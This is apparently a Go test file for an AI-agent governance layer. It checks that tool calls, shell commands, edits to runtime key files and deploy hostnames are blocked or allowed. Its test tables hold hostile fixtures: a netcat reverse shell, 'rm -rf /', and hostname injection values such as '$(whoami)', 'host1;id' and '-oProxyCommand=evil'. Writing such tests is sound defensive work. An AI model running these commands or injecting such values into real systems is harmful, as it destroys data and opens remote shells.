// Copyright (c) 2026 Lateralus Labs, LLC.
// Use of this source code is governed by the Business Source License
// included in the LICENSE file.
//
// As of the Change Date listed in the LICENSE file, this software is
// released under the Apache License, Version 2.0.

package governance

import (
	"encoding/json"
	"path/filepath"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"google.golang.org/protobuf/proto"

	"github.com/zerotrustdata/ztd/internal/constants"

	operatorv1 "github.com/zerotrustdata/ztd/protocol/proto/ztd/operator/v1"
)

func TestL1Doctrine_ValidatePayload_McpCallRequested(t *testing.T) {
	doctrine := NewL1Doctrine()

	tests := []struct {
		name       string
		toolName   string
		shouldFail bool
	}{
		{"safe_tool", "pseudo", false},
		{"safe_tool_2", "issue_tracker", false},
		{"safe_substring_sudo", "pseudo_sudo_tool", false},
		{"safe_substring_su", "summary", false},
		{"blocked_sudo", "sudo", true},
		{"blocked_SUDO_case_insensitive", "SUDO", true},
		{"blocked_su", "su", true},
		{"blocked_rm_rf_root", "rm-rf-root", true},
		{"blocked_rm_rf_root_spaces", "rm rf root", true},
		{"safe_substring_rm_rf", "format_rm_rf_root_tool", false},
		{"blocked_drop_database", "drop_database", true},
		{"safe_substring_drop_database", "my_drop_database_test", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			payload := &operatorv1.McpCallRequested{
				ToolName:      tt.toolName,
				ArgumentsJson: "{}",
			}
			violations := doctrine.ValidatePayload(payload)
			if tt.shouldFail {
				assert.NotEmpty(t, violations, "Expected violations for tool_name: %s", tt.toolName)
			} else {
				assert.Empty(t, violations, "Expected NO violations for tool_name: %s", tt.toolName)
			}
		})
	}
}

// A run_shell_command MCP call executes command plus args as one command line,
// so doctrine must screen that line exactly as it screens EXECUTE_BASH: a
// threat split across the command and its arguments is not a side door.
func TestL1Doctrine_ValidatePayload_RunShellCommandScreensTheExecutedCommandLine(t *testing.T) {
	doctrine := NewL1Doctrine()
	tests := []struct {
		name      string
		arguments string
		blocked   bool
	}{
		{name: "recursive root delete split into args", arguments: `{"command":"rm","args":["-rf","/"]}`, blocked: true},
		{name: "reverse shell split into args", arguments: `{"command":"nc","args":["-e","/bin/sh","10.0.0.1","4444"]}`, blocked: true},
		{name: "recursive root delete in command", arguments: `{"command":"rm -rf /"}`, blocked: true},
		{name: "benign listing split into args", arguments: `{"command":"ls","args":["-la","/srv/app"]}`},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			var request struct {
				Command string   `json:"command"`
				Args    []string `json:"args"`
			}
			require.NoError(t, json.Unmarshal([]byte(tt.arguments), &request))
			commandLine := strings.Join(append([]string{request.Command}, request.Args...), " ")
			assert.Equal(t, tt.blocked, len(doctrine.ValidatePayload(&operatorv1.CommandRequested{Command: commandLine})) > 0,
				"EXECUTE_BASH control for %q", commandLine)

			violations := doctrine.ValidatePayload(&operatorv1.McpCallRequested{
				ToolName:      constants.MCPToolRunShellCommand,
				ArgumentsJson: tt.arguments,
			})
			if tt.blocked {
				assert.NotEmpty(t, violations)
			} else {
				assert.Empty(t, violations)
			}
		})
	}
}

func TestL1Doctrine_ValidatePayload_RuntimeFileEdits(t *testing.T) {
	doctrine := NewL1Doctrine()
	tests := []struct {
		name       string
		path       string
		shouldFail bool
	}{
		{name: "relative runtime control file", path: filepath.Join(constants.RuntimeDirname, "replay.db"), shouldFail: true},
		{name: "absolute runtime control file", path: filepath.Join(string(filepath.Separator), "work", constants.RuntimeDirname, "keys", "operator.key"), shouldFail: true},
		{name: "runtime root prefix lookalike", path: filepath.Join(".ztd-backup", "notes.txt")},
		{name: "evaluation controlled target", path: filepath.Join(constants.RuntimeDirname, constants.EvaluationControlledTargetDirname, "fixture.txt")},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			payloads := map[string]proto.Message{
				"file_edit":    &operatorv1.FileEditRequested{FilePath: tt.path, Operation: "write", Content: "replacement"},
				"restore_file": &operatorv1.RestoreFileRequested{FilePath: tt.path, CommitHash: "abc123", OperatorSessionId: "session-1"},
			}
			for kind, payload := range payloads {
				violations := doctrine.ValidatePayload(payload)
				if tt.shouldFail {
					assert.NotEmpty(t, violations, "expected %s of runtime control path to be rejected: %s", kind, tt.path)
				} else {
					assert.Empty(t, violations, "expected %s of path to be allowed: %s", kind, tt.path)
				}
			}
		})
	}
}

func TestL1Doctrine_ValidatePayload_A2ACallRequested(t *testing.T) {
	doctrine := NewL1Doctrine()

	tests := []struct {
		name       string
		skillName  string
		shouldFail bool
	}{
		{"safe_skill", "pseudo", false},
		{"safe_substring_sudo", "pseudo_sudo_skill", false},
		{"safe_substring_su", "summary", false},
		{"blocked_sudo", "sudo", true},
		{"blocked_SUDO_case_insensitive", "SUDO", true},
		{"blocked_su", "su", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			payload := &operatorv1.A2ACallRequested{
				SkillName:   tt.skillName,
				PayloadJson: "{}",
			}
			violations := doctrine.ValidatePayload(payload)
			if tt.shouldFail {
				assert.NotEmpty(t, violations, "Expected violations for skill_name: %s", tt.skillName)
			} else {
				assert.Empty(t, violations, "Expected NO violations for skill_name: %s", tt.skillName)
			}
		})
	}
}

func TestL1Doctrine_ValidatePayload_OperatorDeployRequested(t *testing.T) {
	doctrine := NewL1Doctrine()

	tests := []struct {
		name       string
		hostnames  []string
		shouldFail bool
	}{
		{"valid_localhost", []string{"localhost"}, false},
		{"valid_hosts", []string{"worker-1.internal", "10.0.0.12"}, false},
		{"empty_hostname", []string{"localhost", ""}, true},
		{"leading_dash", []string{"-oProxyCommand=evil"}, true},
		{"whitespace", []string{"host 1"}, true},
		{"control_char", []string{"host\x00name"}, true},
		{"newline", []string{"host\nname"}, true},
		{"parent_traversal", []string{"../etc/passwd"}, true},
		{"shell_semicolon", []string{"host1;id"}, true},
		{"shell_subshell", []string{"$(whoami)"}, true},
		{"shell_backtick", []string{"`id`"}, true},
		{"shell_pipe", []string{"host1|cat"}, true},
		{"second_element_blocked", []string{"localhost", "host2;rm -rf /"}, true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			payload := &operatorv1.OperatorDeployRequested{
				ExecutionId: "exec-deploy-1",
				Hostnames:   tt.hostnames,
			}
			violations := doctrine.ValidatePayload(payload)
			if tt.shouldFail {
				assert.NotEmpty(t, violations, "expected violations for hostnames %v", tt.hostnames)
			} else {
				assert.Empty(t, violations, "expected no violations for hostnames %v", tt.hostnames)
			}
		})
	}
}
